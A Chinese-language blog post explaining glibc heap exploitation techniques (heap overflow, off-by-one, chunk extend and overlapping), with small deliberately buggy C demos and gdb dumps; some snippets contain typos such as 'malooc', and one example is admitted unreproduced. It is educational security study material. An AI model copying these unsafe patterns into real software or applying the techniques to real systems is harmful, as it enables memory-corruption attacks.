

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Modifier">
  <meta name="keywords" content="">
  
    <meta name="description" content="堆漏洞的利用姿势，赶紧来学习一下吧！！">
<meta property="og:type" content="article">
<meta property="og:title" content="堆漏洞利用(一)">
<meta property="og:url" content="https://shmodifier.github.io/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/index.html">
<meta property="og:site_name" content="Modifier">
<meta property="og:description" content="堆漏洞的利用姿势，赶紧来学习一下吧！！">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://shmodifier.github.io/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
<meta property="article:published_time" content="2023-08-06T07:21:41.000Z">
<meta property="article:modified_time" content="2023-08-06T07:32:58.833Z">
<meta property="article:author" content="Modifier">
<meta property="article:tag" content="Knowledge">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://shmodifier.github.io/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
  
  
  
  <title>堆漏洞利用(一) - Modifier</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"shmodifier.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":false,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Have a nice day!</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="堆漏洞利用(一)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-06 15:21" pubdate>
          2023年8月6日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          25k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          208 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">堆漏洞利用(一)</h1>
            
            
              <div class="markdown-body">
                
                <p>堆漏洞的利用姿势，赶紧来学习一下吧！！</p>
<span id="more"></span>

<p><del>这个人发什么疯</del></p>
<blockquote>
<p>如果没有特殊说明，环境为 ubuntu16  libc2.23  64位</p>
<p>这个网址可以查看源码 ：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.23) - Bootlin</a></p>
</blockquote>
<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>堆溢出是指程序向某个堆块写入的字节数超过了堆块本身<strong>可以使用的字节数</strong>，因而导致了数据溢出，并覆盖到了物理相邻的高地址的下一个堆块。</p>
<p>堆溢出的前提是：</p>
<ul>
<li>程序向堆上写入数据</li>
<li>写入的数据大小没有被良好的控制</li>
</ul>
<p>堆溢出和栈溢出、BSS段溢出相似，是一种缓冲区溢出。但是与栈溢出不同的是，对上并没有返回地址这样的可以让攻击者直接控制执行流程的数据，因此在堆溢出的利用中，我们无法通过控制EIP来控制程序。</p>
<p>但我们可以利用与堆相关的数据结构哇，我们的利用策略如下：</p>
<ul>
<li><p>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容</p>
<ul>
<li><p>prev_size</p>
</li>
<li><p>size，低三位的比特位数据，以及堆块真正的大小</p>
<ul>
<li><p>NON_MAIN_ARENA</p>
</li>
<li><p>IS_MAPPED</p>
</li>
<li><p>PREV_INUSE</p>
</li>
<li><p>the true chunk size</p>
</li>
</ul>
</li>
<li><p>chunk content，改变程序的执行流</p>
</li>
</ul>
</li>
<li><p>利用堆的机制实现任意地址写入或者控制堆块中的内容，从而执行程序的控制流。</p>
</li>
</ul>
<h3 id="举个栗子："><a href="#举个栗子：" class="headerlink" title="举个栗子："></a>举个栗子：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>  <span class="hljs-type">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  gets(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们输入A*100，就可以把相邻的堆覆盖掉</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_first.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_last.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><h5 id="寻找分配函数"><a href="#寻找分配函数" class="headerlink" title="寻找分配函数"></a>寻找分配函数</h5><p>通常来说，堆通过 malloc 函数分配，在某些情况下也会通过 calloc 函数分配。这两个函数的区别就是 calloc 在分配后会将空间全部初始化为0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//等同于</span><br>ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure>

<p>除此之外，还有一个 realloc 分配方式，用于将目标内存扩大。realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reaclloc(prt,size)        <span class="hljs-comment">//将ptr内存大小增大到size。</span><br></code></pre></td></tr></table></figure>

<p>具体操作：</p>
<ul>
<li><p>如果 realloc 的 size 不等于 prt 的 size ：</p>
<ul>
<li>申请 size &gt; 原来的 size<ul>
<li>如果 chunk 与 top chunk 相邻，直接拓展这个 chunk 到新的 size 大小</li>
<li>如果 chunk 与 top chunk 不相邻，相当于 <code>free(ptr); malloc(new_size)</code></li>
</ul>
</li>
<li>申请 size &lt; 原来的 size<ul>
<li>如果相差不足以容纳一个最小的 chunk，（64 位下 32 个字节，32 位下 16 个字节），则保持不变</li>
<li>如果相差足够容纳下一个最小的 chunk，就切割原本的 chunk，free 掉后半部分</li>
</ul>
</li>
</ul>
</li>
<li><p>如果 realloc 的 size 等于 0，相当于 <code>free(prt)</code></p>
</li>
<li><p>如果 realloc 的 size 等于 prt 的 size，那计算机将不进行任何操作</p>
</li>
</ul>
<h5 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h5><p>其实就是栈溢出的时候我们利用的那一批危险函数。常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h5 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h5><p>计算我们开始写入的地址与我们所要覆盖的地址之间的距离。需要注意的是，malloc参数并不等于实际堆块分配的大小，我们之前提到，在实际的内存分配中需要保证chunk 大小是对齐的（字长的两倍）。</p>
<p>并且也并不是机器分配的chunk都是用户可以使用的用户区域，<code>chunk_head.size = 用户区域大小 + 2 * 字长</code></p>
<p>就比如我们使用 <code>malloc(24)</code> ，在 64 位的系统中申请 24 字节的 chunk 。但由于需要保证内存对齐，系统会向上取整到 32 字节。在分配出来的32字节中，又有两个机器字长也就是 16 字节的头部不能供用户使用，所以实际上我们申请 24 字节的字段，实际上用户可以使用的 chunk 为 16 字节。</p>
<p>但是这个堆块仍然可以储存24字节的数据，因为它可以使用下一个 chunk 的 pre_size 字段，正好 24 个字节（ off-by-one 漏洞就是这么来的）。</p>
<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p>严格来讲 off-by-one 也是一种溢出的操作，但是 off-by-one 特指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只<strong>越界了一个字节</strong>的溢出利用。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>off-by-one 是单字节溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况（就像上一个 malloc(24) 的例子）。</p>
<p>其中边界验证不严谨主要有以下几种可能：</p>
<ul>
<li>使用循环语句向堆中写入数据时，循环次数设置错误</li>
<li>字符串操作不正确</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h5 id="溢出字节为可控制字节"><a href="#溢出字节为可控制字节" class="headerlink" title="溢出字节为可控制字节"></a>溢出字节为可控制字节</h5><p>通过修改内存块的大小造成块结构之间的重叠，从而泄露其他块数据，或是覆盖修改其他块数据。</p>
<h5 id="溢出字节为NULL字节"><a href="#溢出字节为NULL字节" class="headerlink" title="溢出字节为NULL字节"></a>溢出字节为NULL字节</h5><p>在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p>
<ul>
<li>使用 unlink 进行处理</li>
<li>这时 <code>prev_size</code> 域就会启用，可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
</ul>
<blockquote>
<p>在glibc2.28及以前的版本中都是可以使用的，最新版本中已经添加了对应的检查方法。</p>
</blockquote>
<h4 id="🌰："><a href="#🌰：" class="headerlink" title="🌰："></a>🌰：</h4><p>栗子1：</p>
<p>导致 off-by-one 漏洞的一个原因就是输入的边界检查不清，以下是一个栅栏错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">my_gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr,<span class="hljs-type">int</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)<br>    &#123;<br>        ptr[i]=getchar();<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input:&quot;</span>);<br>    my_gets(chunk1,<span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如上，我们自己写的 my_gets 函数实际输入 size+1 位数据，造成了 off-by-one 溢出。</p>
<p>我们使用 gdb 对程序进行调试，查看在进行输入分配的堆块为两个十六字节的堆块：</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heap.png" srcset="/img/loading.gif" lazyload></p>
<p>连续输入17个1，会发现覆盖到了下一个 chunk 的 <em>prev_size</em> 字节。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heapflow.png" srcset="/img/loading.gif" lazyload></p>
<p>栗子2：</p>
<p>导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *chunk1;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input&quot;</span>);<br>    gets(buffer);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           <br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个程序乍一看没有任何问题，但是我们需要注意到的是，strlen 的长度计算方法和 strcpy 复制时的长度是不一样的。strlen 计算ASCII 字符串的长度，它在计算长度时是不会把字符串结尾的 ‘\x00’ 计算在内的，但是 strcpy 在复制字符串的时候会拷贝字符串的结束符 ‘\x00’ 。这就导致我们实际上是向chunk1 中写入了25字节。</p>
<p>在strcpy命令执行之前我们的堆结构如下：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b168</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b178</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>

<p>执行后就会发现它覆盖了下一个堆块的低字节（小端序）：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span>	<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b168</span>:	<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span>	<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b178</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000400</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>

<p>（为什么没有截图，因为这玩意我都复现不成功😅）</p>
<blockquote>
<p>这个漏洞在2.29之后就不能利用了，因为glibc更新以后增加了检查的代码。</p>
</blockquote>
<h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>这种攻击目的在于将一个chunk块的可控区域衍生到与其相邻的一个或者多个chunk块中。通过这种攻击方式，我们可以修改到不属于本chunk块的内容。通过 extend 可以实现 chunk overlapping 的效果。</p>
<p>一般来说这种技术并不能直接控制程序的执行流程，但是可以控制chunk 中的内容。如果chunk 中存在字符串指针、函数指针等，就可以利用这些指针来进一步进行信息泄露和程序执行流程。</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p>
<ul>
<li><p>获取当前 chunk 块大小的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 仅用户空间部分的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//SIZE_BITS 在这里是一个代表堆块大小的标志位掩码</span><br><br><span class="hljs-comment">/* 完整堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>获取下一个 chunk 块地址的操作，即使用当前块指针加上当前块大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>获取前一个 chunk 块信息的操作，其中堆块地址的计算是由当前 chunk 地址减去前一个 chunk 的大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 前一个堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* 前一个堆块的地址  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>判断当前堆块是否被使用，即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure></li>
</ul>
<p>通过上面的几个宏我们可以看出， ptmalloc 通过 chunk header 的数据来判断 chunk 的使用情况和对 chunk 前后进行定位。</p>
<p>而我们的 chunk extend 就是通过控制 chunk header 即 size 和 pre_size 域来实现跨越块操作导致 overlapping。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h5 id="🌰1：对-inuse-的-fastbin-进行-extend"><a href="#🌰1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="🌰1：对 inuse 的 fastbin 进行 extend"></a>🌰1：对 inuse 的 fastbin 进行 extend</h5><p>就是通过更改第一个堆块的信息来控制它之后的堆块的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = malooc(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;  <span class="hljs-comment">// 修改第一个块的size域</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    pre3 = malooc(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>

<p>两次 malloc 后堆块中的数据是这样的</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb1.png" srcset="/img/loading.gif" lazyload></p>
<p>修改了 ptr1 的 size 位后对应变成了 41</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb2.png" srcset="/img/loading.gif" lazyload></p>
<p>我们 free 掉它之后， 也对应进入了 0x40 的 bin 中</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb3.png" srcset="/img/loading.gif" lazyload></p>
<p>此时我们再次分配 0x30 的堆块就会把原本属于 ptr2 头部的内存分配到 ptr3 中，</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb4.png" srcset="/img/loading.gif" lazyload></p>
<p>此时原本 chunk2 的头部是现在 ptr3 的用户内容，我们可以直接控制其内容，这种状态就叫做 overlapping chunk。</p>
<h5 id="🌰2：对-inuse-的-unsortedbin-进行-extend"><a href="#🌰2：对-inuse-的-unsortedbin-进行-extend" class="headerlink" title="🌰2：对 inuse 的 unsortedbin 进行 extend"></a>🌰2：对 inuse 的 unsortedbin 进行 extend</h5><p>我们知道处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。</p>
<p>接下来我们就使用 0x80 来分配堆。</p>
